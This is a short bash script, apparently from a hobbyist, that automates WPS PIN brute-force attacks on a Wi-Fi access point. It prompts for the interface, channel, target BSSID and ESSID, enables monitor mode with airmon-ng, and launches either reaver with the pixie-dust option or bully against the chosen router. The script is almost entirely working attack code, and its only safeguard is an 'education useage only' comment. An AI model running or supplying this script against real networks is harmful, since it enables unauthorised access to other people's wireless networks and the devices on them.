#!/bin/bash
# Reaver + Bully WPS Exploiting BRUTE bash script
# Education useage only!
# This has caused a failure in the Randomized WPS system
# Further testing required
# ......
# Intended for use with stock kali-linux packages
# apt update && apt install reaver bully
# Scripting user input for target, channel, interface
echo "You need an adapter in monitor mode to use this"
sleep 10
iwconfig
echo "What interface do we use?:"
read interface
echo "Using:" $interface;
airmon-ng start $interface
echo "What channel is target on?:"
read channel
echo "Using Channel:" $channel;
echo "Whats the target BSSID(MacAddress)?:"
read tmac
echo "Target is:" $tmac
echo "Whats the target ESSID(BroadcastName)?:"
read bname
echo "Target ESSID is:" $bname
# Menu Time
PS3='Choose Attack Type (1: Reaver 2: Bully) or use 3 to quit: '
options=("Reaver" "Bully" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Reaver")
            echo "Reaver Attack Launching"
            reaver -i $interface -b $tmac -c $channel -vvv -K -t 10 -f;;
        "Bully")
            echo "Bully Attack Launching"
            bully $interface -b $tmac -e $bname -c$channel -dFW;;
        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
# Reaver
#reaver -i $interface -b $tmac -c $channel -vvv -K -t 10 -f
#echo "Reaver attack finised"
# Bully
#bully $interface -b $tmac -e $bname -c $channel -dFW
#echo "Bully attack finished"
# ADDED ABOVE TO A SELECT MENU TO AVOID DDOS'n MY ROUTER
echo "If that didnt work, Well, We tried!"
echo "If this failed, you may have used incorrect information, or the AP is not vulernable (WPS)"
done
